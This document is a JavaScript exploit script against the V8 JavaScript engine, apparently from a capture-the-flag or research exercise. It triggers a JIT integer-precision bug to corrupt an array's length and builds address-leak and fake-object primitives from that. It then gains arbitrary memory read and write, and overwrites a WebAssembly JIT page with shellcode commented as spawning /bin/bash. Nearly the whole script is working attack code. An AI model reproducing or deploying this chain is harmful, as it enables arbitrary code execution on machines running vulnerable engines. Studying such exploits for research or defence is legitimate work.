load('js_helpers.js')

let double_arr;
let oob;

function g(trigger)
{

  double_arr = [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9, 1.10];
  oob = [6.1, 6.2, 6.3, 6.4, 6.5, 6.6, 6.7, 6.8];

  let x = trigger == 0 ? 9007199254740989 : 9007199254740992;
  x = x + 1 + 1;
  x -= 9007199254740991;
  x *= 9;					  // this will get me to the offset of the length of oob

  double_arr[x] =  1.39064994160909e-309;         // 0xffff00000000

}

for(let i = 0; i < 0x10000; i++)
{
	g(0);
}

g(1); // overwrite oob array len to 0xffffffff.


let jsval_arr = new Array(0x10);

jsval_arr[0] = 0x41424344;
jsval_arr[1] = {a:1};

let js_val_index = 0;

for(let i = 0; i < 400; i++)
{

  let curr_val = Int64.from_double(oob[i]);

  if(curr_val == 0x4142434400000000)	// magic
  {
    print("[+] Found JSArray at index: " + i);
    js_val_index = i+1;
    break;
  }

  print(curr_val);

}


function addr_of(addr)
{
  jsval_arr[1] = addr;
  let address_res = Int64.from_double(oob[js_val_index]).sub(1);
  return address_res;
}

function obj_at_addr(addr)
{

  let d = Int64.to_Int64(addr).add(1); // pointer tagging
  let u = d.to_double();               // to store in oob as double

  oob[js_val_index] = u;

  let new_ref = jsval_arr[1];
  return new_ref;

}

console.log(test_ref['d']);

let double_arr_map = Int64.from_double(oob[8]);
let double_arr_prop = Int64.from_double(oob[9]);

print("[+] double arr map: " + double_arr_map);
print("[+] double arr props: " + double_arr_prop);

let fake_obj_holder = [1.1, 1.2, 1.3, 1.4];

fake_obj_holder[0] = double_arr_map.to_double();                 // map
fake_obj_holder[1] = double_arr_prop.to_double();                // properties
fake_obj_holder[2] = double_arr_prop.to_double();;               // elements --> corruption target
fake_obj_holder[3] = new Int64(0x0000004000000000).to_double();  // length

%DebugPrint(fake_obj_holder);

let fake_obj_addr = addr_of(fake_obj_holder).sub(0x20);
print("[+] fake object address: " + fake_obj_addr);

let fake = obj_at_addr(fake_obj_addr);

function read64(target_address)
{

  let x1 = target_address.sub(0x10).add(1);  // pointer tagging
  let x2 = x1.to_double();                         // to store in oob as double

  fake_obj_holder[2] = x2;

  return Int64.from_double(fake[0]);

}

function write64(target_address, val)
{

  let x1 = target_address.sub(0x11).add(1);
  let x2 = x1.to_double();

  fake_obj_holder[2] = x2;
  fake[0] = Int64.to_double(val);

}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,
130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,
128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,
142,128,128,128,0,1,136,128,128,128,0,0,65,239,253,182,245,125,11]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var target_func = wasmInstance.exports.main;

let JIT_ptr = read64(addr_of(wasmInstance).add(0xe8));

console.log("[+] JIT pointer address : " + JIT_ptr);

JIT_ptr = JIT_ptr.add(0x1);

//#execve("/bin/bash",{NULL},{NULL})
write64(JIT_ptr, new Int64('0x9090909090909090'));
write64(JIT_ptr.add(8), new Int64('0x732f6e69622fb848'));
write64(JIT_ptr.add(0x10), new Int64('0x50c0315f54500068'));
write64(JIT_ptr.add(0x18), new Int64('0x050f5e545a543bb0'));

target_func();
